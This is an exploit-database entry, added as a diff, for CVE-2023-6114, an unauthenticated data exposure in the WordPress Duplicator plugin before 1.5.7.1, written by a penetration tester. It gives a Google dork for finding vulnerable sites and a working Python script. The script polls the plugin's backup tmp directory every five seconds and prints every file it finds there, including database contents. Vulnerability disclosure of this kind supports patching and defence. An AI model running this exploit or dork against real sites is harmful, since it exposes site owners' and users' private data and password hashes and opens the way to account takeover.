@@ -1,0 +1,107 @@
+id: 39437
+date: 03/11/2024
+title: WordPress Duplicator Plugin < 1.5.7.1 - Unauthenticated Sensitive Data Exposure Account Takeover
+author: Dmitrii Ignatyev
+cves: CVE-2023-6114
+
+# Exploit Title: WordPress Plugin Duplicator < 1.5.7.1 -
+Unauthenticated Sensitive Data Exposure to Account Takeover
+# Google Dork: inurl:("plugins/duplicator/")
+# Date: 2023-12-04
+# Exploit Author: Dmitrii Ignatyev
+# Vendor Homepage:
+https://duplicator.com/?utm_source=duplicator_free&utm_medium=wp_org&utm_content=desc_details&utm_campaign=duplicator_free
+# Software Link: https://wordpress.org/plugins/duplicator/
+# Version: 1.5.7.1
+# Tested on: Wordpress 6.4
+# CVE : CVE-2023-6114# CVE-Link :
+https://wpscan.com/vulnerability/5c5d41b9-1463-4a9b-862f-e9ee600ef8e1/
+
+# CVE-Link : https://research.cleantalk.org/cve-2023-6114-duplicator-poc-exploit/A
+severe vulnerability has been discovered in the directory
+*/wordpress/wp-content/backups-dup-lite/tmp/*. This flaw not only
+exposes extensive information about the site, including its
+configuration, directories, and files, but more critically, it
+provides unauthorized access to sensitive data within the database and
+all data inside. Exploiting this vulnerability poses an imminent
+threat, leading to potential *brute force attacks on password hashes
+and, subsequently, the compromise of the entire system*.*
+POC*:
+
+1) It is necessary that either the administrator or auto-backup works
+automatically at the scheduled time
+
+2) Exploit will send file search requests every 5 seconds
+
+3) I attack the site with this vulnerability using an exploit
+
+Exploit sends a request to the server every 5 seconds along the path
+“*http://your_site/wordpress/wp-content/backups-dup-lite/tmp/
+<http://your_site/wordpress/wp-content/backups-dup-lite/tmp/>”* and if
+it finds something in the index of, it instantly parses all the data
+and displays it on the screen
+
+Exploit (python3):
+
+import requests
+from bs4 import BeautifulSoup
+import re
+import time
+
+url = "http://127.0.0.1/wordpress/wp-content/backups-dup-lite/tmp/"
+processed_files = set()
+
+def get_file_names(url):
+    response = requests.get(url)
+
+    if response.status_code == 200 and len(response.text) > 0:
+        soup = BeautifulSoup(response.text, 'html.parser')
+        links = soup.find_all('a')
+
+        file_names = []
+        for link in links:
+            file_name = link.get('href')
+            if file_name != "../" and not file_name.startswith("?"):
+                file_names.append(file_name)
+
+        return file_names
+    return []
+
+def get_file_content(url, file_name):
+    file_url = url + file_name
+
+
+    if re.search(r'\.zip(?:\.|$)', file_name, re.IGNORECASE):
+        print(f"Ignoring file: {file_name}")
+        return None
+
+    file_response = requests.get(file_url)
+
+    if file_response.status_code == 200:
+        return file_response.text
+    return None
+
+while True:
+    file_names = get_file_names(url)
+
+    if file_names:
+        print("File names on the page:")
+        for file_name in file_names:
+            if file_name not in processed_files:
+                print(file_name)
+                file_content = get_file_content(url, file_name)
+
+                if file_content is not None:
+                    print("File content:")
+                    print(file_content)
+                    processed_files.add(file_name)
+
+    time.sleep(5)
+
+
+
+-- 
+With best regards,
+Dmitrii Ignatyev, Penetration Tester
+
+#  0day.today [2024-03-15]  #
